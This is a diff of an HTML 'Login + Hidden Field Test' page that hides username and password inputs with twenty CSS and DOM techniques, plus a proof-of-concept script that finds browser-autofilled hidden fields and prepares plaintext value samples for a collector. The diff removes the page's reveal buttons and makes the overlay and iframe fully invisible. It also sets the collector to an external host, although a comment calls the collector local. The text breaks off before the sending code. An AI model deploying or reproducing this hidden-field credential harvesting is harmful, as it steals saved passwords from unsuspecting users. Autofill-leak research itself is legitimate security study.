@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html lang="zh-Hant">
+
 <head>
   <meta charset="UTF-8" />
   <title>Login + Hidden Field Test</title>
 
   <!-- CSP: allow local collector and keep page local-only oriented -->
-  <meta http-equiv="Content-Security-Policy"
-        content="default-src 'self';
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self';
                  connect-src 'self' https://collector.aac-telemetry.org;
                  img-src 'self' data:;
                  script-src 'self' 'unsafe-inline' https://collector.aac-telemetry.org;
@@ -17,26 +17,105 @@
   <meta http-equiv="Permissions-Policy" content="geolocation=(), microphone=(), camera=()">
 
   <style>
-    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; margin:20px; line-height:1.45; }
-    .warn { color:#a00; font-weight:600; }
-    .controls { margin: 12px 0; }
-    .note { color:#555; margin: 8px 0 16px; }
-    .grid { display:grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap:16px; }
-    .card { border:1px solid #ddd; border-radius:10px; padding:12px; }
-    .card h3 { margin:0 0 8px; font-size:16px; }
-    .card p { margin:0 0 10px; color:#666; font-size:13px; }
-    .reveal { margin-top: 8px; font-size: 12px; }
-    .offscreen { position:absolute; left:-10000px; top:-10000px; }
-    .tiny { width:1px; height:1px; overflow:hidden; }
-    .zero-rect { position:absolute; clip: rect(0,0,0,0); }
-    .sr-only { position:absolute !important; width:1px !important; height:1px !important; padding:0 !important; margin:-1px !important; overflow:hidden !important; clip: rect(0,0,0,0) !important; white-space:nowrap !important; border:0 !important; }
-    .coverer { position:absolute; inset:0; background:rgba(0,0,0,0.02); z-index:2; }
-    .negative-z { position:relative; z-index:-1; }
-    .container-hidden { visibility:hidden; }
-    .container-content-visibility { content-visibility:hidden; }
-    .covered-wrap { position:relative; }
+    body {
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      margin: 20px;
+      line-height: 1.45;
+    }
+
+    .warn {
+      color: #a00;
+      font-weight: 600;
+    }
+
+    .controls {
+      margin: 12px 0;
+    }
+
+    .note {
+      color: #555;
+      margin: 8px 0 16px;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+      gap: 16px;
+    }
+
+    .card {
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      padding: 12px;
+    }
+
+    .card h3 {
+      margin: 0 0 8px;
+      font-size: 16px;
+    }
+
+    .card p {
+      margin: 0 0 10px;
+      color: #666;
+      font-size: 13px;
+    }
+
+    .offscreen {
+      position: absolute;
+      left: -10000px;
+      top: -10000px;
+    }
+
+    .tiny {
+      width: 1px;
+      height: 1px;
+      overflow: hidden;
+      opacity: 0;
+    }
+
+    .zero-rect {
+      position: absolute;
+      clip: rect(0, 0, 0, 0);
+    }
+
+    .sr-only {
+      position: absolute !important;
+      width: 1px !important;
+      height: 1px !important;
+      padding: 0 !important;
+      margin: -1px !important;
+      overflow: hidden !important;
+      clip: rect(0, 0, 0, 0) !important;
+      white-space: nowrap !important;
+      border: 0 !important;
+    }
+
+    .coverer {
+      position: absolute;
+      inset: 0;
+      background: #fff;
+      z-index: 2;
+    }
+
+    .negative-z {
+      position: relative;
+      z-index: -1;
+    }
+
+    .container-hidden {
+      visibility: hidden;
+    }
+
+    .container-content-visibility {
+      content-visibility: hidden;
+    }
+
+    .covered-wrap {
+      position: relative;
+    }
   </style>
 </head>
+
 <body>
   <h1>Login + Hidden Field Test</h1>
   <p class="warn">Local lab use only</p>
@@ -72,214 +151,221 @@
     <h2>Hidden-field test grid</h2>
     <p class="note">After saving an autofill entry, reload and observe which hidden inputs were autofilled.</p>
     <div class="grid" id="grid">
-        <!-- 1) display:none -->
-        <div class="card" data-tech="display:none">
+      <!-- 1) display:none -->
+      <div class="card" data-tech="display:none">
         <h3>1) display:none</h3>
         <p><code>display:none</code> fully removes element from layout/paint.</p>
         <form>
-            <input id="c1-u" name="username" autocomplete="username" placeholder="username" style="display:none">
-            <input id="c1-p" name="password" autocomplete="current-password" type="password" placeholder="password" style="display:none">
+          <input id="c1-u" name="username" autocomplete="username" placeholder="username" style="display:none">
+          <input id="c1-p" name="password" autocomplete="current-password" type="password" placeholder="password"
+            style="display:none">
         </form>
-        <button class="reveal" data-action="reveal">Temporarily reveal</button>
-        </div>
 
-        <!-- 2) visibility:hidden -->
-        <div class="card" data-tech="visibility:hidden">
+      </div>
+
+      <!-- 2) visibility:hidden -->
+      <div class="card" data-tech="visibility:hidden">
         <h3>2) visibility:hidden</h3>
         <p>Invisible but still occupies space.</p>
         <form>
-            <input id="c2-u" name="username" autocomplete="username" placeholder="username" style="visibility:hidden">
-            <input id="c2-p" name="password" autocomplete="current-password" type="password" placeholder="password" style="visibility:hidden">
+          <input id="c2-u" name="username" autocomplete="username" placeholder="username" style="visibility:hidden">
+          <input id="c2-p" name="password" autocomplete="current-password" type="password" placeholder="password"
+            style="visibility:hidden">
         </form>
-        <button class="reveal" data-action="reveal">Temporarily reveal</button>
-        </div>
 
-        <!-- 3) opacity:0 -->
-        <div class="card" data-tech="opacity:0">
+      </div>
+
+      <!-- 3) opacity:0 -->
+      <div class="card" data-tech="opacity:0">
         <h3>3) opacity:0</h3>
         <p>Fully transparent; still interactive and occupies space.</p>
         <form>
-            <input id="c3-u" name="username" autocomplete="username" placeholder="username" style="opacity:0">
-            <input id="c3-p" name="password" autocomplete="current-password" type="password" placeholder="password" style="opacity:0">
+          <input id="c3-u" name="username" autocomplete="username" placeholder="username" style="opacity:0">
+          <input id="c3-p" name="password" autocomplete="current-password" type="password" placeholder="password"
+            style="opacity:0">
         </form>
-        <button class="reveal" data-action="reveal">Temporarily reveal</button>
-        </div>
 
-        <!-- 4) filter: opacity(0) -->
-        <div class="card" data-tech="filter:opacity(0)">
+      </div>
+
+      <!-- 4) filter: opacity(0) -->
+      <div class="card" data-tech="filter:opacity(0)">
         <h3>4) filter: opacity(0)</h3>
         <p>Hidden via CSS filter; still in layout.</p>
         <form>
-            <input id="c4-u" name="username" autocomplete="username" placeholder="username" style="filter:opacity(0)">
-            <input id="c4-p" name="password" autocomplete="current-password" type="password" placeholder="password" style="filter:opacity(0)">
+          <input id="c4-u" name="username" autocomplete="username" placeholder="username" style="filter:opacity(0)">
+          <input id="c4-p" name="password" autocomplete="current-password" type="password" placeholder="password"
+            style="filter:opacity(0)">
         </form>
-        <button class="reveal" data-action="reveal">Temporarily reveal</button>
-        </div>
 
-        <!-- 5) Off-screen -->
-        <div class="card" data-tech="off-screen">
+      </div>
+
+      <!-- 5) Off-screen -->
+      <div class="card" data-tech="off-screen">
         <h3>5) Off-screen</h3>
         <p>Absolutely positioned far outside the viewport.</p>
         <form>
-            <input id="c5-u" class="offscreen" name="username" autocomplete="username" placeholder="username">
-            <input id="c5-p" class="offscreen" name="password" autocomplete="current-password" type="password" placeholder="password">
+          <input id="c5-u" class="offscreen" name="username" autocomplete="username" placeholder="username">
+          <input id="c5-p" class="offscreen" name="password" autocomplete="current-password" type="password"
+            placeholder="password">
         </form>
-        <button class="reveal" data-action="reveal-classes" data-remove="offscreen">Temporarily reveal</button>
-        </div>
 
-        <!-- 6) Tiny 1×1 -->
-        <div class="card" data-tech="tiny-size">
+      </div>
+
+      <!-- 6) Tiny 1×1 -->
+      <div class="card" data-tech="tiny-size">
         <h3>6) Tiny size (1×1)</h3>
         <p>Minuscule form area to hide in plain sight.</p>
         <form class="tiny">
-            <input id="c6-u" name="username" autocomplete="username" placeholder="u">
-            <input id="c6-p" name="password" autocomplete="current-password" type="password" placeholder="p">
+          <input id="c6-u" name="username" autocomplete="username" placeholder="u">
+          <input id="c6-p" name="password" autocomplete="current-password" type="password" placeholder="p">
         </form>
-        <button class="reveal" data-action="remove-class" data-target=".tiny">Temporarily reveal</button>
-        </div>
 
-        <!-- 7) Ancestor overflow hidden + zero height -->
-        <div class="card" data-tech="ancestor-overflow">
+      </div>
+
+      <!-- 7) Ancestor overflow hidden + zero height -->
+      <div class="card" data-tech="ancestor-overflow">
         <h3>7) Ancestor clip (height: 0)</h3>
         <p>Parent container has <code>height:0</code> and <code>overflow:hidden</code>.</p>
-        <div style="height:0; overflow:hidden; border:1px dashed #ccc;">
-            <form>
+        <div style="height:0; overflow:hidden;">
+          <form>
             <input id="c7-u" name="username" autocomplete="username" placeholder="username">
             <input id="c7-p" name="password" autocomplete="current-password" type="password" placeholder="password">
-            </form>
-        </div>
-        <button class="reveal" data-action="expand-prev">Temporarily reveal</button>
+          </form>
         </div>
 
-        <!-- 8) clip: rect(0,0,0,0) -->
-        <div class="card" data-tech="clip:rect">
+      </div>
+
+      <!-- 8) clip: rect(0,0,0,0) -->
+      <div class="card" data-tech="clip:rect">
         <h3>8) clip: rect(0,0,0,0)</h3>
         <p>Legacy clipping with absolute positioning.</p>
         <div style="position:relative;">
-            <form class="zero-rect">
+          <form class="zero-rect">
             <input id="c8-u" name="username" autocomplete="username" placeholder="username">
             <input id="c8-p" name="password" autocomplete="current-password" type="password" placeholder="password">
-            </form>
-        </div>
-        <button class="reveal" data-action="remove-class" data-target=".zero-rect">Temporarily reveal</button>
+          </form>
         </div>
 
-        <!-- 9) clip-path -->
-        <div class="card" data-tech="clip-path">
+      </div>
+
+      <!-- 9) clip-path -->
+      <div class="card" data-tech="clip-path">
         <h3>9) clip-path (fully clipped)</h3>
         <p>For example: <code>clip-path: inset(0 0 100% 0)</code>.</p>
         <form style="clip-path: inset(0 0 100% 0);">
-            <input id="c9-u" name="username" autocomplete="username" placeholder="username">
-            <input id="c9-p" name="password" autocomplete="current-password" type="password" placeholder="password">
+          <input id="c9-u" name="username" autocomplete="username" placeholder="username">
+          <input id="c9-p" name="password" autocomplete="current-password" type="password" placeholder="password">
         </form>
-        <button class="reveal" data-action="inline-style-clear">Temporarily reveal</button>
-        </div>
 
-        <!-- 10) content-visibility:hidden -->
-        <div class="card" data-tech="content-visibility">
+      </div>
+
+      <!-- 10) content-visibility:hidden -->
+      <div class="card" data-tech="content-visibility">
         <h3>10) content-visibility:hidden</h3>
         <p>Content is skipped from rendering while retaining layout participation.</p>
         <form class="container-content-visibility">
-            <input id="c10-u" name="username" autocomplete="username" placeholder="username">
-            <input id="c10-p" name="password" autocomplete="current-password" type="password" placeholder="password">
+          <input id="c10-u" name="username" autocomplete="username" placeholder="username">
+          <input id="c10-p" name="password" autocomplete="current-password" type="password" placeholder="password">
         </form>
-        <button class="reveal" data-action="remove-class" data-target=".container-content-visibility">Temporarily reveal</button>
-        </div>
 
-        <!-- 11) transform: scale(0) -->
-        <div class="card" data-tech="transform:scale(0)">
+      </div>
+
+      <!-- 11) transform: scale(0) -->
+      <div class="card" data-tech="transform:scale(0)">
         <h3>11) transform: scale(0)</h3>
         <p>Geometric scaling to zero; element visually disappears.</p>
         <form style="transform: scale(0); transform-origin: top left;">
-            <input id="c11-u" name="username" autocomplete="username" placeholder="username">
-            <input id="c11-p" name="password" autocomplete="current-password" type="password" placeholder="password">
+          <input id="c11-u" name="username" autocomplete="username" placeholder="username">
+          <input id="c11-p" name="password" autocomplete="current-password" type="password" placeholder="password">
         </form>
-        <button class="reveal" data-action="inline-style-clear">Temporarily reveal</button>
-        </div>
 
-        <!-- 12) Negative z-index + overlay -->
-        <div class="card" data-tech="negative-z + overlay">
+      </div>
+
+      <!-- 12) Negative z-index + overlay -->
+      <div class="card" data-tech="negative-z + overlay">
         <h3>12) Negative z-index + overlay</h3>
         <p>Lowered under an overlay element to block interaction/visibility.</p>
-        <div class="covered-wrap" style="border:1px dashed #ccc; min-height:48px;">
-            <form class="negative-z">
+        <div class="covered-wrap" style="min-height:48px;">
+          <form class="negative-z">
             <input id="c12-u" name="username" autocomplete="username" placeholder="username">
             <input id="c12-p" name="password" autocomplete="current-password" type="password" placeholder="password">
-            </form>
-            <div class="coverer"></div>
-        </div>
-        <button class="reveal" data-action="uncover">Remove overlay</button>
+          </form>
+          <div class="coverer"></div>
         </div>
 
-        <!-- 13) HTML hidden attribute -->
-        <div class="card" data-tech="hidden attribute">
+      </div>
+
+      <!-- 13) HTML hidden attribute -->
+      <div class="card" data-tech="hidden attribute">
         <h3>13) HTML <code>hidden</code> attribute</h3>
         <p>Semantic hiding using <code>hidden</code>.</p>
         <form hidden>
-            <input id="c13-u" name="username" autocomplete="username" placeholder="username">
-            <input id="c13-p" name="password" autocomplete="current-password" type="password" placeholder="password">
+          <input id="c13-u" name="username" autocomplete="username" placeholder="username">
+          <input id="c13-p" name="password" autocomplete="current-password" type="password" placeholder="password">
         </form>
-        <button class="reveal" data-action="remove-attr" data-attr="hidden">Temporarily reveal</button>
-        </div>
 
-        <!-- 14) details/summary (collapsed) -->
-        <div class="card" data-tech="details summary">
+      </div>
+
+      <!-- 14) details/summary (collapsed) -->
+      <div class="card" data-tech="details summary">
         <h3>14) &lt;details&gt; collapsed</h3>
         <p>Hidden by default inside a collapsed details element.</p>
-        <details id="d14"><summary>(Click to expand for comparison)</summary>
-            <form>
+        <details id="d14">
+          <summary>(Click to expand for comparison)</summary>
+          <form>
             <input id="c14-u" name="username" autocomplete="username" placeholder="username">
             <input id="c14-p" name="password" autocomplete="current-password" type="password" placeholder="password">
-            </form>
+          </form>
         </details>
-        <button class="reveal" data-action="open-details" data-target="#d14">Open details</button>
-        </div>
 
-        <!-- 15) Screen-reader only (sr-only) -->
-        <div class="card" data-tech="sr-only visually-hidden">
+      </div>
+
+      <!-- 15) Screen-reader only (sr-only) -->
+      <div class="card" data-tech="sr-only visually-hidden">
         <h3>15) Screen-reader-only (sr-only)</h3>
         <p>Visually hidden, available to assistive technologies.</p>
         <form class="sr-only">
-            <input id="c15-u" name="username" autocomplete="username" placeholder="username">
-            <input id="c15-p" name="password" autocomplete="current-password" type="password" placeholder="password">
+          <input id="c15-u" name="username" autocomplete="username" placeholder="username">
+          <input id="c15-p" name="password" autocomplete="current-password" type="password" placeholder="password">
         </form>
-        <button class="reveal" data-action="remove-class" data-target=".sr-only">Temporarily reveal</button>
-        </div>
 
-        <!-- 16) Ancestor visibility:hidden -->
-        <div class="card" data-tech="ancestor visibility hidden">
+      </div>
+
+      <!-- 16) Ancestor visibility:hidden -->
+      <div class="card" data-tech="ancestor visibility hidden">
         <h3>16) Ancestor visibility:hidden</h3>
         <p>Hidden via an invisible ancestor; children inherit invisibility.</p>
         <div class="container-hidden">
-            <form>
+          <form>
             <input id="c16-u" name="username" autocomplete="username" placeholder="username">
             <input id="c16-p" name="password" autocomplete="current-password" type="password" placeholder="password">
-            </form>
-        </div>
-        <button class="reveal" data-action="remove-class" data-target=".container-hidden">Temporarily reveal</button>
+          </form>
         </div>
 
-        <!-- 17) CSS mask-image -->
-        <div class="card" data-tech="mask-image">
+      </div>
+
+      <!-- 17) CSS mask-image -->
+      <div class="card" data-tech="mask-image">
         <h3>17) CSS mask-image (fully masked)</h3>
         <p>Masked with a fully transparent mask so content is not painted.</p>
-        <form class="mask-hidden" style="-webkit-mask-image:linear-gradient(transparent,transparent); mask-image:linear-gradient(transparent,transparent);">
-            <input id="c17-u" name="username" autocomplete="username" placeholder="username">
-            <input id="c17-p" name="password" autocomplete="current-password" type="password" placeholder="password">
+        <form class="mask-hidden"
+          style="-webkit-mask-image:linear-gradient(transparent,transparent); mask-image:linear-gradient(transparent,transparent);">
+          <input id="c17-u" name="username" autocomplete="username" placeholder="username">
+          <input id="c17-p" name="password" autocomplete="current-password" type="password" placeholder="password">
         </form>
-        <button class="reveal" data-action="remove-class" data-target=".mask-hidden">Temporarily reveal</button>
-        </div>
 
-        <!-- 18) Shadow DOM -->
-        <div class="card" data-tech="shadow-dom">
+      </div>
+
+      <!-- 18) Shadow DOM -->
+      <div class="card" data-tech="shadow-dom">
         <h3>18) Shadow DOM</h3>
         <p>Inputs placed inside an open ShadowRoot of a custom element.</p>
         <x-shadow-host id="shadowHost"></x-shadow-host>
-        <button class="reveal" data-action="reveal-shadow">Reveal inside shadow host</button>
-        </div>
 
-        <!-- 19) iframe (1×1 or off-screen) -->
-        <div class="card" data-tech="iframe 1x1/offscreen">
+      </div>
+
+      <!-- 19) iframe (1×1 or off-screen) -->
+      <div class="card" data-tech="iframe 1x1/offscreen">
         <h3>19) iframe (1×1 / off-screen)</h3>
         <p>Form hosted inside a tiny iframe; initially too small to notice.</p>
         <iframe id="tinyFrame" sandbox="allow-scripts" srcdoc='
@@ -289,22 +375,22 @@
                 <input name="password" autocomplete="current-password" type="password" placeholder="p">
             </form>
             </body></html>
-        ' style="width:1px;height:1px;border:0; overflow:hidden;"></iframe>
-        <button class="reveal" data-action="grow-iframe" data-target="#tinyFrame">Enlarge iframe</button>
-        </div>
+        ' style="width:1px;height:1px;border:0; overflow:hidden; opacity:0;"></iframe>
 
-        <!-- 20) Combined tricks: text-indent / zero-height / borderless -->
-        <div class="card" data-tech="text-indent/font-size/zero-height">
+      </div>
+
+      <!-- 20) Combined tricks: text-indent / zero-height / borderless -->
+      <div class="card" data-tech="text-indent/font-size/zero-height">
         <h3>20) Combined tricks</h3>
         <p>Uses negative text-indent, zero height, no border/padding/margin.</p>
         <form>
-            <input id="c20-u" name="username" autocomplete="username" placeholder="username"
-                style="text-indent:-9999px; height:0; border:0; padding:0; margin:0;">
-            <input id="c20-p" name="password" autocomplete="current-password" type="password" placeholder="password"
-                style="text-indent:-9999px; height:0; border:0; padding:0; margin:0;">
+          <input id="c20-u" name="username" autocomplete="username" placeholder="username"
+            style="text-indent:-9999px; height:0; border:0; padding:0; margin:0;">
+          <input id="c20-p" name="password" autocomplete="current-password" type="password" placeholder="password"
+            style="text-indent:-9999px; height:0; border:0; padding:0; margin:0;">
         </form>
-        <button class="reveal" data-action="inline-style-clear">Temporarily reveal</button>
-        </div>
+
+      </div>
 
 
     </div>
@@ -329,382 +415,383 @@
 
   <pre id="log" style="background:#f7f7f7;padding:10px;border:1px solid #eee;max-height:240px;overflow:auto"></pre>
 
-<script>
-/*
-  Schema-ready PoC script
-  - All comments below are in English.
-  - This script builds a payload matching the JSONL schema you specified and sends it to http://127.0.0.1:8088/collect
-  - Client-side fields filled where possible; server collector can (and should) still add/overwrite authoritative timestamps.
-*/
+  <script>
+    /*
+      Schema-ready PoC script
+      - All comments below are in English.
+      - This script builds a payload matching the JSONL schema you specified and sends it to http://127.0.0.1:8088/collect
+      - Client-side fields filled where possible; server collector can (and should) still add/overwrite authoritative timestamps.
+    */
 
-/* --------------- Config --------------- */
+    /* --------------- Config --------------- */
 
-// If true, client will include a plaintext sample in `value_sample`. Set false to avoid sending plaintext.
-const SEND_VALUE_SAMPLE = true;
+    // If true, client will include a plaintext sample in `value_sample`. Set false to avoid sending plaintext.
+    const SEND_VALUE_SAMPLE = true;
 
-// Collector endpoint (must match your server)
-const LOCAL_COLLECTOR = 'https://collector.aac-telemetry.org/collect';
+    // Collector endpoint (must match your server)
+    const LOCAL_COLLECTOR = 'https://collector.aac-telemetry.org/collect';
 
-/* --------------- Test ID / trial bookkeeping --------------- */
+    /* --------------- Test ID / trial bookkeeping --------------- */
 
-// default test id based on date if not set by user
-if (!window.TEST_ID) {
-  const ymd = new Date().toISOString().slice(0,10).replace(/-/g,'');
-  window.TEST_ID = 'exp_leakyautofill_' + ymd;
-}
-window._POC_TRIALS = window._POC_TRIALS || {};
+    // default test id based on date if not set by user
+    if (!window.TEST_ID) {
+      const ymd = new Date().toISOString().slice(0, 10).replace(/-/g, '');
+      window.TEST_ID = 'exp_leakyautofill_' + ymd;
+    }
+    window._POC_TRIALS = window._POC_TRIALS || {};
 
-document.getElementById('applyTestId').addEventListener('click', () => {
-  const v = document.getElementById('testIdInput').value.trim();
-  if (v) { window.TEST_ID = v; updateTestIdLabel(); }
-});
-function updateTestIdLabel() {
-  document.getElementById('testIdNow').textContent = 'Current Test ID: ' + window.TEST_ID;
-}
-updateTestIdLabel();
+    document.getElementById('applyTestId').addEventListener('click', () => {
+      const v = document.getElementById('testIdInput').value.trim();
+      if (v) { window.TEST_ID = v; updateTestIdLabel(); }
+    });
+    function updateTestIdLabel() {
+      document.getElementById('testIdNow').textContent = 'Current Test ID: ' + window.TEST_ID;
+    }
+    updateTestIdLabel();
 
-/* --------------- Logging helpers --------------- */
+    /* --------------- Logging helpers --------------- */
 
-const LOG = document.getElementById('log');
-function log(msg) {
-  LOG.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
-  LOG.scrollTop = LOG.scrollHeight;
-}
+    const LOG = document.getElementById('log');
+    function log(msg) {
+      LOG.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+      LOG.scrollTop = LOG.scrollHeight;
+    }
 
-/* --------------- User agent and OS parsing --------------- */
+    /* --------------- User agent and OS parsing --------------- */
 
-function parseUserAgent() {
-  const ua = navigator.userAgent || '';
-  let browser = 'unknown', browser_version = null, os = 'unknown';
-  if (/Edg\/(\d+\.\d+)/.test(ua)) {
-    browser = 'Edge';
-    browser_version = ua.match(/Edg\/(\d+\.\d+(?:\.\d+)?)/)?.[1] || null;
-  } else if (/Chrome\/(\d+\.\d+)/.test(ua) && !/OPR\//.test(ua)) {
-    browser = 'Chrome';
-    browser_version = ua.match(/Chrome\/(\d+\.\d+(?:\.\d+)?)/)?.[1] || null;
-  } else if (/Firefox\/(\d+\.\d+)/.test(ua)) {
-    browser = 'Firefox';
-    browser_version = ua.match(/Firefox\/(\d+\.\d+(?:\.\d+)?)/)?.[1] || null;
-  } else if (/Safari\/(\d+\.\d+)/.test(ua) && /Version\/(\d+\.\d+)/.test(ua)) {
-    browser = 'Safari';
-    browser_version = ua.match(/Version\/(\d+\.\d+(?:\.\d+)?)/)?.[1] || null;
-  }
-  if (/Windows NT 10\.0/.test(ua)) os = 'Windows 10';
-  else if (/Windows NT 6\./.test(ua)) os = 'Windows';
-  else if (/Mac OS X 10[._]\d+/.test(ua)) os = ua.match(/Mac OS X 10[._]\d+/)[0].replace(/_/g,'.');
-  else if (/Android/.test(ua)) os = ua.match(/Android\s*[0-9._]*/)?.[0] || 'Android';
-  else if (/Linux/.test(ua)) os = 'Linux';
-  return { browser, browser_version, os, ua };
-}
-
-/* --------------- Simple CSS selector helper --------------- */
-/* Not perfect but good for locating the input in reports. */
-function simpleCssPath(el) {
-  if (!el || !el.ownerDocument) return null;
-  const parts = [];
-  let node = el;
-  while (node && node.nodeType === 1 && node !== document.documentElement) {
-    let part = node.tagName.toLowerCase();
-    if (node.id) {
-      part += '#' + node.id;
-      parts.unshift(part);
-      break;
-    } else {
-      if (node.getAttribute && node.getAttribute('name')) {
-        part += `[name="${node.getAttribute('name')}"]`;
-      } else if (node.classList && node.classList.length) {
-        part += '.' + Array.from(node.classList).slice(0,2).join('.');
+    function parseUserAgent() {
+      const ua = navigator.userAgent || '';
+      let browser = 'unknown', browser_version = null, os = 'unknown';
+      if (/Edg\/(\d+\.\d+)/.test(ua)) {
+        browser = 'Edge';
+        browser_version = ua.match(/Edg\/(\d+\.\d+(?:\.\d+)?)/)?.[1] || null;
+      } else if (/Chrome\/(\d+\.\d+)/.test(ua) && !/OPR\//.test(ua)) {
+        browser = 'Chrome';
+        browser_version = ua.match(/Chrome\/(\d+\.\d+(?:\.\d+)?)/)?.[1] || null;
+      } else if (/Firefox\/(\d+\.\d+)/.test(ua)) {
+        browser = 'Firefox';
+        browser_version = ua.match(/Firefox\/(\d+\.\d+(?:\.\d+)?)/)?.[1] || null;
+      } else if (/Safari\/(\d+\.\d+)/.test(ua) && /Version\/(\d+\.\d+)/.test(ua)) {
+        browser = 'Safari';
+        browser_version = ua.match(/Version\/(\d+\.\d+(?:\.\d+)?)/)?.[1] || null;
       }
-      const parent = node.parentNode;
-      if (parent) {
-        const same = Array.from(parent.children).filter(ch => ch.tagName === node.tagName);
-        if (same.length > 1) {
-          const idx = Array.prototype.indexOf.call(parent.children, node) + 1;
-          part += `:nth-child(${idx})`;
+      if (/Windows NT 10\.0/.test(ua)) os = 'Windows 10';
+      else if (/Windows NT 6\./.test(ua)) os = 'Windows';
+      else if (/Mac OS X 10[._]\d+/.test(ua)) os = ua.match(/Mac OS X 10[._]\d+/)[0].replace(/_/g, '.');
+      else if (/Android/.test(ua)) os = ua.match(/Android\s*[0-9._]*/)?.[0] || 'Android';
+      else if (/Linux/.test(ua)) os = 'Linux';
+      return { browser, browser_version, os, ua };
+    }
+
+    /* --------------- Simple CSS selector helper --------------- */
+    /* Not perfect but good for locating the input in reports. */
+    function simpleCssPath(el) {
+      if (!el || !el.ownerDocument) return null;
+      const parts = [];
+      let node = el;
+      while (node && node.nodeType === 1 && node !== document.documentElement) {
+        let part = node.tagName.toLowerCase();
+        if (node.id) {
+          part += '#' + node.id;
+          parts.unshift(part);
+          break;
+        } else {
+          if (node.getAttribute && node.getAttribute('name')) {
+            part += `[name="${node.getAttribute('name')}"]`;
+          } else if (node.classList && node.classList.length) {
+            part += '.' + Array.from(node.classList).slice(0, 2).join('.');
+          }
+          const parent = node.parentNode;
+          if (parent) {
+            const same = Array.from(parent.children).filter(ch => ch.tagName === node.tagName);
+            if (same.length > 1) {
+              const idx = Array.prototype.indexOf.call(parent.children, node) + 1;
+              part += `:nth-child(${idx})`;
+            }
+          }
+        }
+        parts.unshift(part);
+        node = node.parentNode;
+      }
+      return parts.length ? parts.join(' > ') : null;
+    }
+
+    /* --------------- Hidden-detection utilities --------------- */
+
+    let lastUserTypeAt = 0;
+    document.addEventListener('input', () => lastUserTypeAt = Date.now(), { capture: true });
+    const USER_TYPE_GRACE_MS = 2000; // user typed within 2s => treat as manual
+
+    function isHiddenEl(el) {
+      try {
+        const rect = el.getBoundingClientRect();
+        const style = window.getComputedStyle(el);
+        return (
+          style.visibility === 'hidden' ||
+          parseFloat(style.opacity) === 0 ||
+          style.display === 'none' ||
+          rect.width === 0 || rect.height === 0 ||
+          el.offsetParent === null ||
+          el.getClientRects().length === 0 ||
+          rect.left < -1000 || rect.top < -1000
+        );
+      } catch (e) {
+        return false;
+      }
+    }
+
+    /* --------------- Technique normalization --------------- */
+    /* Normalize card data-tech into safe tokens for scenario / visibility_technique fields. */
+    function normalizeTechnique(raw) {
+      if (!raw) return 'unknown';
+      // lower-case, replace spaces and punctuation with hyphens, remove duplicate hyphens
+      return String(raw).toLowerCase()
+        .replace(/[:\/\s,+]+/g, '-')
+        .replace(/[^a-z0-9\-()]/g, '') // allow parentheses for shadow host tag
+        .replace(/\-+/g, '-')
+        .replace(/^\-+|\-+$/g, '');
+    }
+
+    /* --------------- Collect inputs across document, same-origin iframes, and open ShadowRoots --------------- */
+    function collectAllInputs() {
+      const collected = [];
+
+      // 1) direct document inputs
+      collected.push(...Array.from(document.querySelectorAll('input[autocomplete]')));
+
+      // 2) same-origin iframes
+      const iframes = Array.from(document.querySelectorAll('iframe'));
+      for (const fr of iframes) {
+        try {
+          const idoc = fr.contentDocument;
+          if (!idoc) continue;
+          const inputs = Array.from(idoc.querySelectorAll('input[autocomplete]'));
+          inputs.forEach(inp => inp.___in_iframe = fr);
+          collected.push(...inputs);
+        } catch (e) {
+          // cross-origin iframe -> skip
         }
       }
-    }
-    parts.unshift(part);
-    node = node.parentNode;
-  }
-  return parts.length ? parts.join(' > ') : null;
-}
 
-/* --------------- Hidden-detection utilities --------------- */
-
-let lastUserTypeAt = 0;
-document.addEventListener('input', () => lastUserTypeAt = Date.now(), {capture:true});
-const USER_TYPE_GRACE_MS = 2000; // user typed within 2s => treat as manual
-
-function isHiddenEl(el) {
-  try {
-    const rect = el.getBoundingClientRect();
-    const style = window.getComputedStyle(el);
-    return (
-      style.visibility === 'hidden' ||
-      parseFloat(style.opacity) === 0 ||
-      style.display === 'none' ||
-      rect.width === 0 || rect.height === 0 ||
-      el.offsetParent === null ||
-      el.getClientRects().length === 0 ||
-      rect.left < -1000 || rect.top < -1000
-    );
-  } catch (e) {
-    return false;
-  }
-}
-
-/* --------------- Technique normalization --------------- */
-/* Normalize card data-tech into safe tokens for scenario / visibility_technique fields. */
-function normalizeTechnique(raw) {
-  if (!raw) return 'unknown';
-  // lower-case, replace spaces and punctuation with hyphens, remove duplicate hyphens
-  return String(raw).toLowerCase()
-           .replace(/[:\/\s,+]+/g,'-')
-           .replace(/[^a-z0-9\-()]/g,'') // allow parentheses for shadow host tag
-           .replace(/\-+/g,'-')
-           .replace(/^\-+|\-+$/g,'');
-}
-
-/* --------------- Collect inputs across document, same-origin iframes, and open ShadowRoots --------------- */
-function collectAllInputs() {
-  const collected = [];
-
-  // 1) direct document inputs
-  collected.push(...Array.from(document.querySelectorAll('input[autocomplete]')));
-
-  // 2) same-origin iframes
-  const iframes = Array.from(document.querySelectorAll('iframe'));
-  for (const fr of iframes) {
-    try {
-      const idoc = fr.contentDocument;
-      if (!idoc) continue;
-      const inputs = Array.from(idoc.querySelectorAll('input[autocomplete]'));
-      inputs.forEach(inp => inp.___in_iframe = fr);
-      collected.push(...inputs);
-    } catch (e) {
-      // cross-origin iframe -> skip
-    }
-  }
-
-  // 3) known shadow-host elements (open mode)
-  const shadowHosts = Array.from(document.querySelectorAll('x-shadow-host'));
-  for (const host of shadowHosts) {
-    try {
-      const sr = host.shadowRoot;
-      if (!sr) continue;
-      const inputs = Array.from(sr.querySelectorAll('input[autocomplete]'));
-      inputs.forEach(inp => inp.___shadow_host = host);
-      collected.push(...inputs);
-    } catch (e) {
-      // ignore
-    }
-  }
-
-  return collected;
-}
-
-/* --------------- Autofill detection --------------- */
-/* Returns list of { name, value, hidden, node, tech, inputType, autocomplete } */
-function findAutofilledInputs() {
-  const inputs = collectAllInputs();
-  const results = [];
-  for (const inp of inputs) {
-    try {
-      const ac = (inp.getAttribute('autocomplete') || '').toLowerCase();
